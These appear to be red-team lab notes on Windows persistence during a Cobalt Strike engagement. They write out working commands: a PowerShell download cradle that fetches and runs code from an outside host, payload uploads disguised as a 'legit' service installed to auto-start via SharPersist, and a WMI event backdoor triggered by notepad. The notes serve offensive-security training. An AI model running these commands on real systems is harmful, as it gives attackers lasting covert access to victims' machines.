# Persistence 



Persistence is a method of regaining or maintaining access to a compromised machine, without having to exploit the initial compromise steps all over again. Workstations are volatile since users tend to logout or reboot them frequently.

If you've gained initial access through a phishing campaign, it's unlikely you'll be able to do so again if your current Beacon is lost, which could be the end of the engagement. If you're on an assume-breach (or indeed in this lab) and have access to an internal host, the loss of complete access to the environment is less of a concern. However, you may still need to drop one or more persistence mechanisms on hosts you control if your simulated threat would also do so.

Installing persistence usually involves making some configuration change or dropping a payload to disk, which is why they can carry a high risk of detection, but they are also very useful (and practically essential) during long-term engagements. You must strike a delicate balance of keeping the operation going and getting caught.

Persistence can be executed within userland (e.g. as the current user) or in an elevated context such as SYSTEM. Elevated persistence requires that we become local admin on the host first, which is covered in the Privilege Escalation section coming up next.

Common userland persistence methods include:

    HKCU / HKLM Registry Autoruns
    Scheduled Tasks
    Startup Folder

 

Cobalt Strike doesn't include any built-in commands specifically for persistence. SharPersist is a Windows persistence toolkit written by FireEye. It's written in C#, so can be executed via execute-assembly.


# Windows Task Scheduler 

The Windows Task Scheduler allows us to create "tasks" that execute on a pre-determined trigger. That trigger could be a time of day, on user-logon, when the computer goes idle, when the computer is locked, or a combination thereof.

Let's create a scheduled task that will execute a PowerShell payload once every hour.  To save ourselves from having to deal with lots of quotations in the IEX cradle, we can encode it to base64 and execute it using the -EncodedCommand parameter in PowerShell (often appreciated to -enc).  This is a little complicated to do, because it must use Unicode encoding (rather than UTF8 or ASCII).

### PowerShell:

PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

# Hunting for COM Hijacks 

Instead of hijacking COM objects that are in-use and breaking applications that rely on them, a safer strategy is to find instances of applications trying to load objects that don't actually exist (so-called "abandoned" keys).  Process Monitor is part of the excellent Sysinternals Suite. It shows real-time file system, registry and process activity and is very useful in finding different types of privilege escalation primitives.

It's more straight forward to hunt for hijacks on your own machine first, and then implement them on the actual target.  Launch procmon64.exe on Attacker Desktop.

Due to the sheer number of events generated, filtering is essential to find the ones of interest. We're looking for:

    RegOpenKey operations.
    where the Result is NAME NOT FOUND.
    and the Path ends with InprocServer32.

# Persistent when SYSTEM

For these methods to work, you must be running in a high integrity Beacon.
Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons.  Use P2P or DNS Beacons instead.

## Windows Services 
Used for privilege escalation but also persistence, creating your own service 

beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add

[*] INFO: Adding service persistence
[*] INFO: Command: C:\Windows\legit-svc.exe
[*] INFO: Command Args: 
[*] INFO: Service Name: legit-svc

[+] SUCCESS: Service persistence added

This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

beacon> connect localhost 4444 
^ spawns beacon as SYSTEM 

## WMI Events 

Persistence via WMI events can be achieved by leveraging the following three classes:

    EventConsumer
    EventFilter
    FilterToConsumerBinding

An EventConsumer is the action that we want to perform - in this case, to execute a payload.  This can be via OS commands (such as a PowerShell one-liner) or VBScript.  An EventFilter is a trigger that we can act upon.  Any arbitrary WMI query can be used as a filter which provides practically unlimited options.  These can include when a particular process starts, when a user logs in, when a USB device is inserted, any specific time of day or on a timed interval.  The FilterToConsumerBinding simply links an EventConsumer and EventFilter together.


PowerLurk is a PowerShell tool for building these WMI events.  In this example, I will upload a DNS payload into the Windows directory, import PowerLurk.ps1 and create a new WMI event subscription that will execute it whenever notepad is started.

beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe

You can view these classes afterwards using Get-WmiEvent -Name WmiBackdoor.  The CommandLineTemplate for the EventConsumer will simply be C:\Windows\dns_x64.exe; and query for the EventFilter will be SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName='notepad.exe'.

Open notepad on Workstation 2 and the DNS Beacon will appear. The backdoor can be removed with Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject.
